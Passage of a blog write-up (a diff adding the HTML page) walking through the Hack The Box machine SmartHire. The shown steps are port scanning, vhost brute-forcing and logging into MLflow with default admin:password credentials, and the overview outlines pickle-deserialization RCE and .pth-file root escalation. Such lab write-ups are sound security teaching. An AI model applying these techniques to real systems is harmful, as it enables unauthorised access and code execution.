@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/09/27/hackthebox-smarthire/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSmartHire is a medium-difficulty Linux machine from Hack The Box that revolves around a self-hosted MLflow model registry. We start by discovering a models. subdomain protected by MLflow’s bas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: SmartHire">
+<meta property="og:url" content="http://fouedsaidi.com/2026/09/27/Hackthebox-SmartHire/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSmartHire is a medium-difficulty Linux machine from Hack The Box that revolves around a self-hosted MLflow model registry. We start by discovering a models. subdomain protected by MLflow’s bas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/SmartHire/SmartHire.png">
+<meta property="article:published_time" content="2026-09-27T12:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-27T17:43:58.102Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="hackthebox">
+<meta property="article:tag" content="MLflow">
+<meta property="article:tag" content="Pickle Deserialization">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="python .pth">
+<meta property="article:tag" content="site.addsitedir">
+<meta property="article:tag" content="sudo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/SmartHire/SmartHire.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: SmartHire -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: SmartHire</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-09-27 15:00</span>
+        <span class="mobile">2026-09-27 15:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-09-27 20:43:58</span>
+            <span class="mobile">2026-09-27 20:43:58</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/MLflow/">MLflow</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pickle-Deserialization/">Pickle Deserialization</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/RCE/">RCE</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/python-pth/">python .pth</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/site-addsitedir/">site.addsitedir</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sudo/">sudo</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>SmartHire is a medium-difficulty Linux machine from Hack The Box that revolves around a self-hosted MLflow model registry. We start by discovering a <code>models.</code> subdomain protected by MLflow’s basic-auth, which still ships the default <code>admin:password</code> credentials. The front-end SmartHire application trains and loads a per-user model from that registry, so we abuse MLflow’s artifact-proxy to overwrite the model’s <code>python_model.pkl</code> with a malicious pickle. When the app calls <code>mlflow.pyfunc.load_model()</code> on our poisoned model, our <code>__reduce__</code> payload fires and lands us a shell as <code>svcweb</code>. For privilege escalation, a <code>NOPASSWD</code> sudo entry runs a custom Python helper that calls <code>site.addsitedir()</code> on a directory writable by our <code>devs</code> group, so we drop a <code>.pth</code> file whose <code>import</code> line executes as root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SmartHire/SmartHire.png"
+                      alt="SmartHire-info-card"
+                ><figcaption>SmartHire-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We kick things off with a full TCP port scan to make sure we don’t miss anything above the top-1000:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nmap -p- --min-rate 5000 -T4 10.129.245.215 -oN nmap-fast.txt</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 05:02 +0000</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.245.215</span><br><span class="line">Host is up (0.047s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.24 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>Only two ports open, so we run a service&#x2F;version scan on both:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nmap -sV -sC -p 22,80 10.129.245.215 -oN nmap-sv.txt</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)</span><br><span class="line">|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Overview | SmartHIRE</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>Our usual SSH on 22 and an nginx web application on port 80. Curling the IP gives us a 301 redirect with the canonical hostname in the <code>Location:</code> header:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -sI http://10.129.245.215/</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Location: http://smarthire.htb/</span><br></pre></td></tr></table></figure></div>
+
+<p>We add <code>smarthire.htb</code> to our <code>/etc/hosts</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">echo</span> <span class="string">&quot;10.129.245.215 smarthire.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Walking-the-landing-page"><a href="#Walking-the-landing-page" class="headerlink" title="Walking the landing page"></a>Walking the landing page</h3><p>Grepping through the landing page for anything that hints at the tech stack:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s http://smarthire.htb/ | grep -iE <span class="string">&#x27;title|product|powered|model|api&#x27;</span> | <span class="built_in">head</span></span><br><span class="line">&lt;title&gt;Overview | SmartHIRE&lt;/title&gt;</span><br><span class="line">            &lt;a href=<span class="string">&quot;/#products&quot;</span> class=<span class="string">&quot;px-3 py-2 rounded-md hover:bg-gray-800&quot;</span>&gt;Products&lt;/a&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;p-4 rounded-lg bg-gray-800/60&quot;</span>&gt;Model Registry&lt;/div&gt;</span><br><span class="line">              &lt;li&gt;&lt;a href=<span class="string">&quot;#&quot;</span> class=<span class="string">&quot;text-gray-400 hover:text-gray-300 hover:underline&quot;</span>&gt;API Reference&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>“Model Registry” listed under their products is the breadcrumb here. On a box like this that almost always means there’s an MLflow-flavoured service sitting somewhere on the host, and it’s usually a sibling vhost.</p>
+<h3 id="Vhost-brute-forcing"><a href="#Vhost-brute-forcing" class="headerlink" title="Vhost brute-forcing"></a>Vhost brute-forcing</h3><p>We loop a small list of obvious names through <code>Host:</code> headers. The baseline for a non-existent host is a 301 (size 178) back to the canonical site, so anything that <em>isn’t</em> 301&#x2F;178 is worth a closer look:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">cat</span> &gt; subs.txt &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">api admin dev <span class="built_in">test</span> staging models model ml mlflow registry</span><br><span class="line">auth sso git gitlab jenkins www mail portal app backend</span><br><span class="line">EOF</span><br><span class="line">kujen@kujen:~$ <span class="keyword">for</span> s <span class="keyword">in</span> $(<span class="built_in">cat</span> subs.txt); <span class="keyword">do</span></span><br><span class="line">    out=$(curl -s -H <span class="string">&quot;Host: <span class="variable">$&#123;s&#125;</span>.smarthire.htb&quot;</span> http://10.129.245.215/ \</span><br><span class="line">        -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125; %&#123;size_download&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;s&#125;</span>.smarthire.htb -&gt; <span class="variable">$&#123;out&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">api.smarthire.htb -&gt; 301 178</span><br><span class="line">admin.smarthire.htb -&gt; 301 178</span><br><span class="line">dev.smarthire.htb -&gt; 301 178</span><br><span class="line">test.smarthire.htb -&gt; 301 178</span><br><span class="line">staging.smarthire.htb -&gt; 301 178</span><br><span class="line">models.smarthire.htb -&gt; 401 137       &lt;-- only outlier</span><br><span class="line">model.smarthire.htb -&gt; 301 178</span><br><span class="line">ml.smarthire.htb -&gt; 301 178</span><br><span class="line">mlflow.smarthire.htb -&gt; 301 178</span><br><span class="line">registry.smarthire.htb -&gt; 301 178</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p><code>models.smarthire.htb</code> returns a 401 instead of the 301 sink, meaning there’s a real backend behind it. We add it to <code>/etc/hosts</code> and check the headers:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">echo</span> <span class="string">&quot;10.129.245.215 models.smarthire.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">kujen@kujen:~$ curl -sI http://models.smarthire.htb/</span><br><span class="line">HTTP/1.1 401 UNAUTHORIZED</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 137</span><br><span class="line">WWW-Authenticate: Basic realm=<span class="string">&quot;mlflow&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>WWW-Authenticate: Basic realm=&quot;mlflow&quot;</code> gives it away, this is MLflow’s built-in basic-auth.</p>
+<h2 id="MLflow-Default-Credentials"><a href="#MLflow-Default-Credentials" class="headerlink" title="MLflow - Default Credentials"></a>MLflow - Default Credentials</h2><p>MLflow’s <code>mlflow-auth</code> module ships a <code>default_permissions.ini</code> that seeds exactly one admin account: <code>admin:password</code>. Lazy deployments never rotate it, so we try it against the version endpoint:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password http://models.smarthire.htb/version</span><br><span class="line">2.14.1</span><br></pre></td></tr></table></figure></div>
+
+<p>We’re in, and <strong>MLflow 2.14.1</strong> sits squarely inside the pickle-deserialization-RCE window. Any consumer that calls <code>mlflow.pyfunc.load_model()</code> against a model whose flavour is <code>python_function</code> will <code>cloudpickle.load</code> the model’s <code>python_model.pkl</code>. That’s just <code>pickle.load</code> with extras, so if we can write a malicious <code>__reduce__</code> into that file, we get code execution wherever the consumer loads the model.</p>
+<h2 id="Mapping-the-SmartHire-App"><a href="#Mapping-the-SmartHire-App" class="headerlink" title="Mapping the SmartHire App"></a>Mapping the SmartHire App</h2><p>The exploit needs a <em>consumer</em>, someone who actually calls <code>pyfunc.load_model()</code> against a registered model. The SmartHire front-end is the obvious candidate, so let’s map how it uses the registry.</p>
+<h3 id="Registering-an-account"><a href="#Registering-an-account" class="headerlink" title="Registering an account"></a>Registering an account</h3><p>The <code>/register</code> form takes a <code>username</code>, <code>company</code> and <code>password</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar \</span><br><span class="line">    -d <span class="string">&quot;username=pentester&amp;company=acme&amp;password=Passw0rd!&quot;</span> \</span><br><span class="line">    http://smarthire.htb/register -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;\n&quot;</span></span><br><span class="line">200</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Finding-our-model-name"><a href="#Finding-our-model-name" class="headerlink" title="Finding our model name"></a>Finding our model name</h3><p>We log in and pull the dashboard’s <code>model_info</code> endpoint:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar -L \</span><br><span class="line">    -d <span class="string">&quot;username=pentester&amp;password=Passw0rd!&quot;</span> \</span><br><span class="line">    http://smarthire.htb/login -o /dev/null -w <span class="string">&quot;%&#123;url_effective&#125;\n&quot;</span></span><br><span class="line">http://smarthire.htb/dashboard</span><br><span class="line">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar http://smarthire.htb/model_info</span><br><span class="line">&#123;<span class="string">&quot;model_info&quot;</span>:null,<span class="string">&quot;model_name&quot;</span>:<span class="string">&quot;acme-78c78b2f6a9f-model&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;success&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The model name is derived from the company name we registered with (<code>acme</code> -&gt; <code>acme-78c78b2f6a9f-model</code>), and no model has been trained yet (<code>model_info: null</code>).</p>
+<h3 id="Training-a-model-to-poison"><a href="#Training-a-model-to-poison" class="headerlink" title="Training a model to poison"></a>Training a model to poison</h3><p>The dashboard’s example CSV goes to <code>/upload_hiring_data</code>, which both trains the user’s model and registers it in MLflow. We give it something to chew on:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">cat</span> &gt; hiring.csv &lt;&lt;<span class="string">&#x27;CSV&#x27;</span></span><br><span class="line">name,skills,experience,education,position_applied,previous_company</span><br><span class="line">John Smith,<span class="string">&quot;Python, Machine Learning, SQL&quot;</span>,60,Master<span class="string">&#x27;s in CS,Data Scientist,TechCorp</span></span><br><span class="line"><span class="string">Sarah Johnson,&quot;JavaScript, React, Node.js&quot;,36,Bachelor&#x27;</span>s <span class="keyword">in</span> SE,Full Stack Dev,StartupXYZ</span><br><span class="line">Mike Brown,<span class="string">&quot;Java, Spring Boot, PostgreSQL&quot;</span>,84,Bachelor<span class="string">&#x27;s in IT,Backend Developer,Enterprise Inc</span></span><br><span class="line"><span class="string">Alice Davis,&quot;Go, Kubernetes, AWS&quot;,72,Master&#x27;</span>s <span class="keyword">in</span> CS,DevOps,CloudCorp</span><br><span class="line">Bob Lee,<span class="string">&quot;Python, TensorFlow, PyTorch&quot;</span>,96,PhD,ML Engineer,AI Inc</span><br><span class="line">CSV</span><br><span class="line">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar -F <span class="string">&quot;file=@hiring.csv&quot;</span> \</span><br><span class="line">    http://smarthire.htb/upload_hiring_data</span><br><span class="line">&#123;<span 